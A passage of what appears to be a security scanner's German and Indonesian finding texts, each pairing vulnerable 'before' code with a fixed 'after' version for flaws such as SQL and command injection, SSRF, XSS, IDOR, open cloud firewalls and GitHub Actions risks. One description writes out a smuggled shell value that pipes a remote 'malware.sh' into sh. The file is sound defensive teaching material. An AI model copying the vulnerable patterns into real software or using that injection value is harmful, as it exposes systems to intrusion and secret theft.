    "gitlab-ci-unpinned-image": {
      title: 'Image Docker pipeline GitLab CI tidak dipatok ke versi tertentu',
      description: '"image:" pada pipeline menunjuk ke image tanpa tag (setara dengan ":latest") atau secara eksplisit ke ":latest". Siapa pun yang mengelola image tersebut bisa mengganti isinya kapan saja tanpa repository berubah — pipeline yang sama bisa mulai menjalankan kode berbeda dari satu hari ke hari berikutnya, risiko rantai pasokan yang secara konsep sama dengan GitHub Action yang direferensikan lewat tag, bukan commit.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # tag spesifik (atau lebih baik lagi digest "node@sha256:...") alih-alih "latest"`,
      },
    },
},
  de: {
  "supabase-service-role-in-client": {
    title: "Der geheime Supabase-Schlüssel landet in einer für den Browser bestimmten Datei",
    description:
      "Eine Variable mit öffentlichem Präfix (z. B. NEXT_PUBLIC_, VITE_) oder eine clientseitige Datei verweist auf den Service-Role-Key von Supabase. Dieser Schlüssel umgeht die Row Level Security: Landet er im Browser-Bundle, kann ihn jeder lesen und als Datenbankadministrator auftreten.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (nur Server)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Passwörter oder geheime Schlüssel sind direkt im Code geschrieben",
    description:
      "Ein API-Schlüssel, ein Token oder ein Passwort scheinen als literaler Wert geschrieben zu sein, statt aus einer Umgebungsvariable gelesen zu werden. Wer den Quellcode liest (oder das Repository, falls öffentlich), bekommt dieses Geheimnis.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "Eine Datei mit den echten Passwörtern des Projekts ist unter den analysierten Dateien",
    description:
      "Eine .env-Datei mit echten Werten (keine .env.example) ist in der Analyse enthalten. Landet diese Datei in einem Repository oder einem öffentlichen Deploy, sind alle enthaltenen Zugangsdaten offengelegt.",
    fix: {
      before: `# .env (versehentlich committet)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (committet)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env bleibt außerhalb des Repos (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Jeder kann die Daten aller Nutzer lesen oder ändern",
    description:
      "Row Level Security ist deaktiviert, oder eine Policy erlaubt jedem Zugriff (USING (true)), ohne zu prüfen, wer die Anfrage stellt. Jeder authentifizierte Nutzer — oder sogar ein anonymer — kann die Daten aller anderen lesen oder ändern.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Ein vom Nutzer eingegebener Wert wird direkt in eine Datenbankabfrage eingefügt",
    description:
      "Eine SQL-Abfrage wird durch direktes Verketten oder Interpolieren eines Strings gebaut, statt Parameter zu verwenden. Kommt dieser Text (auch indirekt) von einem Nutzer, kann er die Abfrage selbst verändern — SQL-Injection.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Passwörter scheinen nicht geschützt zu sein",
    description:
      "Ein Passwort-Feld wird genau so gespeichert, wie es in der Anfrage ankam, und in der Datei erscheint keine Hashing-Funktion (bcrypt, argon2, scrypt). Wird die Datenbank kompromittiert, sind alle Passwörter sofort verwendbar.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "Das Secret zum Signieren von Logins ist im Klartext im Code geschrieben",
    description:
      "Das an jwt.sign / jwt.verify übergebene Secret (oder die Variable JWT_SECRET) ist ein literaler Wert im Code, statt aus einer Umgebungsvariable zu kommen. Wer es liest, kann gültige Zugriffstoken für jeden Nutzer erstellen.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "Der Server kann gezwungen werden, externe Befehle auszuführen",
    description:
      "Eine Funktion, die Systembefehle ausführt (exec, execSync, spawn), erhält einen durch Interpolation oder Verkettung gebauten String. Kommt ein Teil dieses Strings aus einer Nutzereingabe, kann wer ihn kontrolliert beliebige Befehle auf dem Server ausführen.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "unprotected-new-table": {
    title: "Eine neue Tabelle scheint ohne Schutz erstellt zu werden",
    description:
      "Eine SQL-Migration erstellt eine Tabelle, aktiviert aber nicht die Row Level Security für diese Tabelle in derselben Datei. Solange das so bleibt, entsteht die Tabelle ohne jede Einschränkung, wer sie lesen oder beschreiben darf.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "Die Seite akzeptiert Anfragen von jeder anderen Website",
    description:
      "Der CORS-Header ist so eingestellt, dass er Anfragen von jedem Ursprung akzeptiert (*), oder die Middleware cors() wird ohne Einschränkungen verwendet. Jede Drittanbieter-Website kann deine APIs aus dem Browser eines bereits authentifizierten Nutzers aufrufen.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://deineseite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "Eine Funktion mit Admin-Rechten prüft nicht, wer sie nutzt",
    description:
      "Eine Route oder Funktion, deren Name auf Admin-Operationen hindeutet, enthält in den nahegelegenen Zeilen keine Authentifizierungs- oder Rollenprüfung. Jeder, der die URL kennt, könnte sie ausführen.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "Die Seite kann gezwungen werden, externen Code auszuführen",
    description:
      "Eine ausgehende HTTP-Anfrage (fetch, axios) verwendet direkt einen aus der Anfrage eines Nutzers stammenden Wert als Ziel-URL. Ein böswilliger Nutzer kann deinen Server dazu bringen, interne oder beliebige Adressen aufzurufen — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.deindienst.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL nicht erlaubt")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Passwörter sind mit einer mittlerweile leicht zu knackenden Methode geschützt",
    description:
      "In derselben Zeile werden md5() oder sha1() auf einen mit einem Passwort verknüpften Wert angewendet. Diese Algorithmen sind zu schnell berechenbar: Ein Angreifer mit der Datenbank kann Milliarden Passwörter pro Sekunde ausprobieren.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "xss-dangerous-html": {
    title: "Von Nutzern geschriebener Text könnte Code im Browser ausführen",
    description:
      "Inhalt wird als rohes HTML in die Seite eingefügt (dangerouslySetInnerHTML, v-html, .innerHTML) statt als einfacher Text. Enthält dieser Inhalt Nutzereingaben, kann er Skripte enthalten, die im Browser jedes Lesers der Seite ausgeführt werden.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// oder, falls HTML nötig ist: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "Der Speicherplatz für hochgeladene Dateien ist für jeden sichtbar",
    description:
      "Ein Storage-Bucket (Supabase Storage, S3) ist als öffentlich konfiguriert. Enthält er Dokumente, Fotos oder von Nutzern hochgeladene Dateien, kann jeder, der den Pfad kennt — oder errät —, ohne Authentifizierung darauf zugreifen.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// Dateien mit zeitlich begrenzten signierten URLs ausliefern: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Ein einziger Link reicht, um Daten zu löschen oder zu ändern",
    description:
      "Eine GET-Route führt eine Operation aus, die Daten ändert (der Pfad enthält delete/remove/update/edit). GET-Anfragen laufen schon beim bloßen Besuch eines Links oder beim Laden eines Bildes von einer externen Seite — der klassische Ansatzpunkt für einen CSRF-Angriff.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Im Browser gespeicherte Zugangsdaten sind nicht gut geschützt",
    description:
      "Ein Zugriffstoken wird in localStorage gespeichert. Anders als bei einem httpOnly-Cookie kann jedes auf der Seite laufende Skript (einschließlich eines über XSS eingeschleusten schädlichen Skripts) es lesen und stehlen.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// das Token serverseitig als httpOnly-Cookie setzen:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "Die Seite kann genutzt werden, um auf eine Betrugsseite umzuleiten",
    description:
      "Die Seite leitet den Nutzer zu einer Adresse weiter, die direkt aus der Anfrage stammt (query, body, params), ohne zu prüfen, dass es sich um eine bekannte Domain handelt. Ein Link, der so aussieht, als führe er zu deiner Seite, kann in Wirklichkeit zu einer Phishing-Seite führen.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Das Ändern einer Zahl in der Adresse könnte fremde Daten anzeigen",
    description:
      "Eine Datenbankabfrage verwendet direkt einen aus der URL stammenden Identifikator (req.params.id), ohne in den nahegelegenen Zeilen zu prüfen, ob er zum anfragenden Nutzer gehört. Das Ändern der id in der Adresse könnte Zugriff auf die Daten eines anderen Nutzers geben — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "Das Login-Formular blockiert nicht zu viele Versuche hintereinander",
    description:
      "Eine Login-Route ist in der Datei definiert, aber es gibt keine Spur einer Rate-Limiting-Middleware in derselben Datei. Ohne ein Limit für Versuche kann ein Angreifer Passwörter nacheinander ausprobieren (Brute Force), ohne gebremst zu werden.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Passwörter oder sensible Daten landen in Logs",
    description:
      "Ein Aufruf von console.log (oder ähnlich) enthält eine Variable namens password, token, secret oder apiKey. Landen diese Logs in einem externen Dienst oder einer Datei, bleiben die sensiblen Daten viel länger als nötig im Klartext sichtbar.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "path-traversal": {
    title: "Eine Datei auf dem Server kann durch Wahl des Pfads von außen gelesen oder geschrieben werden",
    description:
      "Eine Funktion, die eine Datei liest, schreibt oder sendet, erhält den Pfad direkt aus einem Anfragewert (query, body, params), ohne zu prüfen, dass er innerhalb eines erlaubten Ordners bleibt. Ein Angreifer kann \"../\" einfügen, um den vorgesehenen Ordner zu verlassen und beliebige Dateien auf dem Server zu lesen oder zu überschreiben (z. B. eine Konfigurationsdatei mit Zugangsdaten).",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Pfad nicht erlaubt")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Ein vom Nutzer eingegebener Wert wird als Code innerhalb einer MongoDB-Abfrage ausgeführt",
    description:
      "Der $where-Operator von MongoDB führt serverseitiges JavaScript für jedes Dokument aus — wird dieser String durch Verketten eines vom Nutzer stammenden Werts gebaut, kann wer ihn kontrolliert beliebigen Code im Kontext der Datenbank ausführen lassen, nicht nur den Filter wie bei einer normalen SQL-Injection verändern.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Ein vom Nutzer eingegebener Wert wird als Template interpretiert, nicht als Daten",
    description:
      "Eine Funktion, die ein Template kompiliert/rendert, erhält das GESAMTE Template aus einem Anfragewert, statt ein festes Template zu verwenden und nur die Daten zu übergeben. Ein Angreifer kann direkt in der Syntax der Template-Engine schreiben (z. B. {{7*7}} bei Jinja2) und Code auf dem Server ausführen — Server-Side Template Injection, das oft zu beliebiger Befehlsausführung führt, nicht nur zu einem Anzeigeproblem wie bei XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "Der XML-Parser kann gezwungen werden, Dateien zu lesen oder externe Anfragen zu stellen",
    description:
      "Ein XML-Parser (DocumentBuilderFactory) wird erstellt, ohne in den nahegelegenen Zeilen externe Entitäten (DOCTYPE) explizit zu deaktivieren. Erhält der Parser XML aus einer nicht vertrauenswürdigen Quelle, kann ein Angreifer eine externe Entität definieren, um Dateien auf dem Server zu lesen oder ihn zu einer Adresse seiner Wahl kontaktieren zu lassen — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "terraform-open-security-group": {
    title: "Eine Terraform-Security-Group öffnet einen sensiblen Port für das gesamte Internet",
    description:
      "Eine Regel mit \"cidr_blocks\", die 0.0.0.0/0 (jede IP-Adresse) enthält, liegt nahe an einem sensiblen Port — SSH (22), RDP (3389) oder einem typischen Datenbank-Port (MySQL, Postgres, MongoDB, Redis, SQL Server). Jeder im Internet kann versuchen, sich mit diesem Dienst zu verbinden, nicht nur wer es sollte.",
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # nur dein privates Netzwerk, oder ein Bastion-Host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Eine Google-Cloud-Firewallregel öffnet einen sensiblen Port für das gesamte Internet",
    description:
      "Eine \"google_compute_firewall\"-Ressource mit \"source_ranges\", die 0.0.0.0/0 (jede IP-Adresse) enthält, erlaubt Traffic zu einem sensiblen Port — SSH (22), RDP (3389) oder einem typischen Datenbank-Port (MySQL, Postgres, MongoDB, Redis, SQL Server). Jeder im Internet kann versuchen, sich mit diesem Dienst zu verbinden, nicht nur wer es sollte.",
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # nur dein privates Netzwerk, oder ein Bastion-Host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Eine Azure-Netzwerkregel öffnet einen sensiblen Port für das gesamte Internet",
    description:
      "Eine Netzwerksicherheitsregel (\"azurerm_network_security_rule\", oder ein \"security_rule\"-Block innerhalb von \"azurerm_network_security_group\") mit \"source_address_prefix\" auf \"*\" oder \"0.0.0.0/0\", Richtung \"Inbound\" und Zugriff \"Allow\", nahe an einem sensiblen Port — SSH (22), RDP (3389) oder einem typischen Datenbank-Port. Jeder im Internet kann versuchen, sich mit diesem Dienst zu verbinden, nicht nur wer es sollte.",
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # nur dein privates Netzwerk, oder ein Bastion-Host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Ein Secret ist als Standardwert einer Terraform-Variable geschrieben",
    description:
      "Eine Variable mit einem Namen wie password/secret/token/key hat einen literalen Wert in ihrem \"default\". Anders als ein zur Laufzeit übergebener Wert (tfvars, Umgebungsvariablen TF_VAR_*), landet ein Default im Quellcode — und wenn das Repository geteilt oder öffentlich ist, sieht ihn jeder, selbst ohne Zugriff auf den Terraform-State.",
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # kein Default: muss über eine .tfvars-Datei (außerhalb von git) oder eine Umgebungsvariable TF_VAR_db_password übergeben werden\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Ein von einem externen Nutzer kontrollierter Wert gelangt direkt in einen Shell-Befehl der CI",
    description:
      'Ein "run:"-Befehl eines GitHub-Actions-Workflows interpoliert direkt einen Wert wie den Titel eines Pull Requests, den Namen eines Branches oder den Text eines Kommentars — alle von jedem beschreibbar, der einen Pull Request oder Kommentar öffnet, sogar aus einem externen Fork. Ein Wert wie `"; curl malware.sh | sh #` würde beliebige Befehle in der CI ausführen, mit Zugriff auf alle in diesem Workflow verfügbaren Secrets.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # als Umgebungsvariable übergeben, nie direkt in den Befehl interpoliert`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "Der Workflow führt den Code eines externen Pull Requests mit Zugriff auf die Secrets des Repositorys aus",
    description:
      'Der Workflow verwendet "pull_request_target" — der auch für einen aus einem fremden Fork geöffneten Pull Request mit den Berechtigungen und Secrets des Basis-Repositorys läuft — und checkt den Code des Pull Requests selbst aus ("github.event.pull_request.head"), nicht den Basis-Branch. Wer den Pull Request öffnet, erhält damit faktisch die Ausführung des eigenen Codes mit Zugriff auf diese Secrets.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Checkt den Basis-Branch aus, nicht den Code der PR — oder verwende\n      # "pull_request" statt "pull_request_target", wenn die weiter\n      # gefassten Berechtigungen/Secrets nicht nötig sind.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Anfragedaten werden mit einem Format deserialisiert, das Code ausführen kann",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) oder die Node-Bibliothek node-serialize deserialisieren einen Wert, der direkt aus der Anfrage stammt. Anders als JSON können diese Formate während der Deserialisierung selbst Code darstellen und ausführen — wer den gesendeten Wert kontrolliert, kann beliebige Codeausführung auf dem Server erreichen.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON führt beim Parsen nie Code aus, anders als pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'Der Code akzeptiert explizit unsignierte JWT-Token (Algorithmus "none")',
    description:
      '"none" erscheint unter den akzeptierten Algorithmen zur Verifizierung eines JWT-Tokens. Ein Token mit dem Algorithmus "none" hat keine zu prüfende Signatur: Jeder kann eines mit beliebigem Inhalt erstellen (z. B. eine Admin-Rolle), und der Code würde es als gültig akzeptieren.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // "none" niemals unter den akzeptierten Algorithmen zulassen`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access ist bei einem in Terraform definierten S3-Bucket deaktiviert",
    description:
      'Eine oder mehrere der vier Schutzmaßnahmen von "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) sind auf false gesetzt. Das bedeutet nicht, dass der Bucket schon öffentlich ist, nimmt aber ein Sicherheitsnetz weg, das verhindern würde, dass er versehentlich öffentlich gemacht wird.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Eine in Terraform definierte IAM-Policy gewährt vollen Zugriff",
    description:
      'Ein Statement mit Aktion "*" und Ressource "*" gewährt vollen Zugriff auf jeden AWS-Dienst und jede Ressource — derselbe Check, der bereits für den Live-IAM-Status durchgeführt wird, hier aber direkt aus dem Code gelesen, noch bevor er überhaupt angewendet wird. Das kann für eine Notfallrolle gewollt sein, sollte aber bestätigt werden: Für den täglichen Gebrauch gewähre nur die wirklich benötigten Berechtigungen.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::dein-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Ein Google-Cloud-Storage-Bucket wird für jeden lesbar gemacht",
    description:
      'Eine "google_storage_bucket_iam_member"- oder "google_storage_bucket_iam_binding"-Ressource gewährt "allUsers" oder "allAuthenticatedUsers" eine Rolle — ersteres macht den Bucket für jeden im Internet lesbar, sogar ohne Google-Konto; letzteres für jeden mit einem beliebigen Google-Konto, nicht nur für wen es sollte.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:jemand@example.com"  # nur wer wirklich Zugriff haben muss, nicht allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Öffentlicher Blob-Zugriff ist bei einem Azure-Storage-Konto aktiviert",
    description:
      '"allow_blob_public_access" ist bei einem "azurerm_storage_account" auf true gesetzt: Wer die URL eines öffentlich gemachten Blobs/Containers kennt, kann ihn ohne jede Authentifizierung lesen.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Eine Google-Cloud-IAM-Rolle gewährt vollen Zugriff (Owner/Editor)",
    description:
      'Ein "google_project_iam_binding"/"google_project_iam_member" (oder das Äquivalent auf Organisations-/Ordnerebene) weist die primitive Rolle "roles/owner" oder "roles/editor" zu — nahezu vollständigen Zugriff auf jeden Dienst im Projekt. Das kann für ein Notfallkonto gewollt sein, sollte aber bestätigt werden: Für den täglichen Gebrauch gewähre nur die spezifischeren vordefinierten Rollen, die wirklich nötig sind.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # nur die vordefinierte Rolle, die wirklich nötig ist, nicht roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Eine Azure-Rollenzuweisung gewährt vollen Zugriff (Owner)",
    description:
      'Ein "azurerm_role_assignment" weist die Rolle "Owner" zu — vollen Zugriff, einschließlich der Kontrolle über die Berechtigungen anderer Nutzer, auf den gesamten zugewiesenen Scope (Subscription, Ressourcengruppe...). Das kann für ein Notfallkonto gewollt sein, sollte aber bestätigt werden: Für den täglichen Gebrauch gewähre nur die spezifischere Rolle, die wirklich nötig ist (z. B. "Contributor" auf eine einzelne Ressourcengruppe).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # nur die spezifischere Rolle, die wirklich nötig ist, nicht Owner auf die gesamte Subscription\n}`,
    },
  },
  "weak-random-token": {
    title: "Ein Sicherheitstoken wird mit einem nicht kryptografisch sicheren Zufallszahlengenerator erzeugt",
    description:
      "Ein Wert mit einem Namen wie token/session/reset/otp/csrf wird mit Math.random() (JS), random.random() (Python) oder rand() (PHP) erzeugt — Generatoren, die nicht für Sicherheit gedacht sind und deren Sequenzen vorhersehbar sind. Ein so erzeugtes Token kann erraten oder rekonstruiert werden, was den Zweck zunichtemacht, für den es existiert (z. B. ein Link zum Zurücksetzen des Passworts, den jeder vorhersehen kann).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, nicht Math.random — unvorhersehbar`,
    },
  },
  "ldap-injection": {
    title: "Ein LDAP-Filter wird durch direktes Verketten eines Anfragewerts gebaut",
    description:
      'Eine Zeile, die einen LDAP-Filter baut (z. B. "(uid=...)"), enthält direkt einen aus der Anfrage stammenden Wert, ohne jegliches Escaping der LDAP-Sonderzeichen. Wer diesen Wert kontrolliert, kann die Logik des Filters verändern — zum Beispiel eine Authentifizierungsprüfung umgehen oder Verzeichnisdaten lesen, die er nicht sehen sollte.',
    fix: {
      before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // LDAP-Sonderzeichen müssen immer escaped werden, bevor sie in einem Filter verwendet werden\nclient.search(base, { filter });`,
    },
  },
  "header-injection": {
    title: "Ein Anfragewert landet direkt in einem HTTP-Antwort-Header",
    description:
      "Ein HTTP-Antwort-Header wird mit einem direkt aus der Anfrage stammenden Wert gesetzt (query, body, params), ohne zu prüfen, dass er keinen Zeilenumbruch (CRLF) enthält. Ein Angreifer kann zusätzliche Header oder sogar eine völlig andere Antwort einfügen — Response Splitting —, wodurch er Caching, Cookies oder den anderen Nutzern angezeigten Inhalt manipulieren kann.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "gha-unpinned-action": {
    title: "Eine Drittanbieter-Action in der CI ist nicht auf eine genaue Version (Commit-SHA) festgelegt",
    description:
      'Der Workflow verwendet eine über Tag oder Branch referenzierte Drittanbieter-Action (z. B. "@v1", "@main") statt per Commit-SHA. Wer sie pflegt — oder wer das Konto kompromittiert — kann diese Referenz jederzeit auf einen anderen Commit verschieben und so heimlich ändern, was in der CI läuft, mit Zugriff auf deren Secrets. Ein Commit-SHA zeigt immer auf exakt denselben Code.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, auf den Commit-SHA festgelegt — SHA aktualisieren, wenn du die Version aktualisierst`,
    },
  },
  "gha-excessive-permissions": {
    title: "Der Workflow gewährt sich alle Token-Rechte statt nur der tatsächlich genutzten",
    description:
      '"permissions: write-all" gewährt dem GITHUB_TOKEN des Workflows Schreibzugriff auf alles — Issues, Pull Requests, Pakete, Deployments — auch wenn der Workflow nur einen Teil davon nutzt. Wird ein Schritt des Workflows kompromittiert (eine schädliche Abhängigkeit, ein eingeschleustes Skript), vergrößern diese weiter gefassten Rechte, was jemand, der das ausnutzt, tun kann.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # nur die Rechte, die der Workflow wirklich nutzt`,
    },
  },
  "insecure-cookie-flags": {
    title: "Ein Sitzungs- oder Authentifizierungs-Cookie ist ohne die Flags Secure und HttpOnly gesetzt",
    description:
      'Ein Cookie mit einem an Sitzung/Auth/Token erinnernden Namen ist ohne "httpOnly" und "secure" unter seinen Optionen gesetzt. Ohne httpOnly kann JavaScript auf der Seite — einschließlich über XSS eingeschleustem Code — dieses Cookie lesen. Ohne secure kann es auch über eine unverschlüsselte HTTP-Verbindung gesendet werden.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "vulnerable-dependency": (original) => ({
